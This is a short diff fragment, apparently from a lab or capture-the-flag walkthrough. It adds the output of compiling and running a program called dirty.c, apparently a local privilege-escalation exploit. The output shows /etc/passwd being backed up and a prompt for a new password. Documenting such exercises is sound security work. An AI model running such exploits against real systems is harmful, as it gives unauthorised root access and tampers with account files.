@@ -147,3 +147,6 @@ EOF
 > gcc dirty.c -o dirty -pthread -lcrypt
 
 > ./dirty
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: pass
+
